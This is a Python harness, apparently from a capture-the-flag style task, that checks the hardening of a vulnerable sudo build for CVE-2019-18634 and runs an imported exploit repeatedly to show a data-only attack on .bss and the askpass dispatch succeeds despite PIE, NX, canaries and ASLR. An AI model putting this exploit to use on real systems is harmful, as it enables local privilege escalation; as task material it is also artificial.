#!/usr/bin/env python3
"""
Mitigation-bypass evidence for the CVE-2019-18634 task.

Runs *inside the container* as `player` and proves, with numbers, that the
intermediate exploit defeats the enabled hardening instead of relying on it
being absent:

  1. Static hardening of the target: PIE, FULL RELRO (BIND_NOW), stack canary,
     NX stack, and no RWX segment.
  2. ASLR is enabled (randomize_va_space=2) and the kernel really randomizes
     PIE code addresses (a proxy PIE binary shows distinct `startcode`s).
  3. The exploit succeeds across all runs under that full hardening.
  4. The attack is data-only: it corrupts .bss data and the askpass dispatch,
     executing no attacker-supplied code, so NX is irrelevant to it and the
     relative .bss offsets make ASLR/PIE irrelevant.

Usage (inside the container):
    python3 mitigation_invariance.py --runs 16
"""

import argparse
import json
import os
import re
import subprocess
import sys

sys.path.insert(0, "/home/player/answer")
import common  # noqa: E402

SUDO = "/opt/vuln/bin/sudo"
HELPER = "/tmp/askpass_helper.sh"
PROOF = "/home/player/answer/proofs/proof_intermediate.txt"
PROXY = "/usr/bin/sleep"


def static_hardening():
    def run(*a):
        return subprocess.run(a, capture_output=True, text=True).stdout

    hdr = run("readelf", "-h", SUDO)
    dyn = run("readelf", "-d", SUDO)
    seg = run("readelf", "-W", "-l", SUDO)
    sym = run("nm", SUDO)
    gnu_stack = re.search(r"GNU_STACK\s+(\S+)", seg)
    return {
        "pie": "DYN" in hdr,
        "full_relro_bind_now": "BIND_NOW" in dyn,
        "stack_canary": "__stack_chk_fail" in sym,
        "nx_stack": bool(gnu_stack) and "E" not in gnu_stack.group(1),
        "no_rwx_segment": "RWE" not in seg,
    }


def proxy_startcode():
    """Randomized code start of a dumpable PIE binary (ASLR evidence)."""
    proc = subprocess.Popen([PROXY, "0.3"])
    try:
        with open("/proc/%d/stat" % proc.pid) as fh:
            stat = fh.read()
        return stat[stat.rfind(")") + 2:].split()[23]  # startcode
    except (OSError, IndexError):
        return None
    finally:
        proc.wait()


def run_hijack():
    try:
        os.unlink(PROOF)
    except OSError:
        pass
    common.run_exploit(SUDO, HELPER, os.getuid(), os.getgid(), timeout=20)
    try:
        with open(PROOF) as fh:
            return "invoked_by_sudo=1" in fh.read()
    except OSError:
        return False


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--runs", type=int, default=16)
    ap.add_argument("--base-samples", type=int, default=8)
    args = ap.parse_args()

    report = {"hardening": static_hardening()}
    try:
        with open("/proc/sys/kernel/randomize_va_space") as fh:
            report["randomize_va_space"] = fh.read().strip()
    except OSError:
        report["randomize_va_space"] = "unknown"

    bases = [b for b in (proxy_startcode() for _ in range(args.base_samples)) if b]
    report["proxy_startcodes"] = bases
    report["distinct_proxy_startcodes"] = len(set(bases))
    report["aslr_randomizing_pie"] = len(set(bases)) > 1

    ok = sum(1 for _ in range(args.runs) if run_hijack())
    report["hijack_success"] = ok
    report["hijack_runs"] = args.runs
    report["hijack_rate"] = round(ok / args.runs, 4)

    print(json.dumps(report, indent=2))
    return 0 if ok == args.runs else 1


if __name__ == "__main__":
    sys.exit(main())